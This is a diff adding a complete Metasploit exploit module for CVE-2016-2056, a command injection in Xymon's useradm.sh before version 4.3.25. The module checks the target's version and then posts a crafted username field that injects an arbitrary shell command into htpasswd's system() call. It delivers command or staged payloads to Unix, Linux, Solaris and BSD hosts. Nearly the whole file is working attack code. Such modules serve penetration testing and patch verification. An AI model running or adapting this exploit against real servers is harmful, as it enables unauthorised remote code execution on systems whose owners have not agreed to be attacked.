@@ -1,0 +1,188 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Xymon useradm Command Execution',
+      'Description' => %q{
+        This module exploits a command injection vulnerability in Xymon
+        versions before 4.3.25 which allows authenticated users
+        to execute arbitrary operating system commands as the web
+        server user.
+
+        When adding a new user to the system via the web interface with
+        `useradm.sh`, the user's username and password are passed to
+        `htpasswd` in a call to `system()` without validation.
+
+        This module has been tested successfully on Xymon version 4.3.10
+        on Debian 6.
+      },
+      'License'     => MSF_LICENSE,
+      'Author'      => [
+        'Markus Krell', # Discovery
+        'bcoles'        # Metasploit
+      ],
+      'References'  =>
+        [
+          ['CVE', '2016-2056'],
+          ['PACKETSTORM', '135758'],
+          ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],
+          ['URL', 'https://www.securityfocus.com/archive/1/537522/100/0/threaded'],
+          ['URL', 'https://sourceforge.net/p/xymon/code/7892/'],
+          ['URL', 'https://www.debian.org/security/2016/dsa-3495']
+        ],
+      'DisclosureDate' => '2016-02-14',
+      'Platform'       => %w(unix linux solaris bsd),
+      'Targets'        =>
+        [
+          [
+            'Unix CMD',
+            {
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'Payload' => {
+                'Space' => 2048,
+                'BadChars' => "\x00\x0A\x0D",
+                'DisableNops' => true,
+                'Compat' =>
+                {
+                  'PayloadType' => 'cmd',
+                  'RequiredCmd' => 'generic perl python netcat php'
+                }
+              }
+            }
+          ],
+          [
+            'Linux',
+            {
+              'Platform' => 'linux',
+              'Arch'     => [ARCH_X86,ARCH_X64],
+            }
+          ],
+          [
+            'Solaris',
+            {
+              'Platform' => 'solaris',
+              'Arch' => [ARCH_X86]
+            }
+          ],
+          [
+            'BSD',
+            {
+              'Platform' => 'bsd',
+              'Arch' => [ARCH_X86, ARCH_X64]
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0))
+    register_options([
+      OptString.new('TARGETURI', [
+        true, 'The base path to Xymon secure CGI directory', '/xymon-seccgi/'
+      ]),
+      OptString.new('USERNAME', [true, 'The username for Xymon']),
+      OptString.new('PASSWORD', [true, 'The password for Xymon'])
+    ])
+  end
+
+  def user
+    datastore['USERNAME']
+  end
+
+  def pass
+    datastore['PASSWORD']
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'useradm.sh'),
+      'authorization' => basic_auth(user, pass)
+    })
+
+    unless res
+      vprint_status "#{peer} - Connection failed"
+      return CheckCode::Unknown
+    end
+
+    if res.code == 401
+      vprint_status "#{peer} - Authentication failed"
+      return CheckCode::Unknown
+    end
+
+    if res.code == 404
+      vprint_status "#{peer} - useradm.sh not found"
+      return CheckCode::Safe
+    end
+
+    unless res.body.include?('Xymon')
+      vprint_status "#{peer} - Target is not a Xymon server."
+      return CheckCode::Safe
+    end
+
+    version = res.body.scan(/>Xymon ([\d\.]+)</).flatten.first
+
+    unless version
+      vprint_status "#{peer} - Could not determine Xymon version"
+      return CheckCode::Detected
+    end
+
+    vprint_status "#{peer} - Xymon version #{version}"
+
+    if Gem::Version.new(version) >= Gem::Version.new('4.3.25')
+      return CheckCode::Safe
+    end
+
+    CheckCode::Appears
+  end
+
+  def execute_command(cmd, opts = {})
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'useradm.sh'),
+      'method' => 'POST',
+      'authorization' => basic_auth(user, pass),
+      'vars_post' => Hash[{
+        'USERNAME'   => "';#{cmd} & echo '",
+        'PASSWORD'   => '',
+        'SendCreate' => 'Create'
+      }.to_a.shuffle]
+    }, 5)
+
+    return if session_created?
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code == 401
+      fail_with(Failure::NoAccess, 'Authentication failed')
+    end
+
+    unless res.code == 500
+      fail_with(Failure::Unknown, 'Unexpected reply')
+    end
+
+    print_good "#{peer} - Payload sent successfully"
+
+    res
+  end
+
+  def exploit
+    unless [Exploit::CheckCode::Detected, Exploit::CheckCode::Appears].include?(check)
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if payload.arch.first == 'cmd'
+      execute_command(payload.encoded)
+    else
+      execute_cmdstager(linemax: 1_500)
+    end
+  end
+end
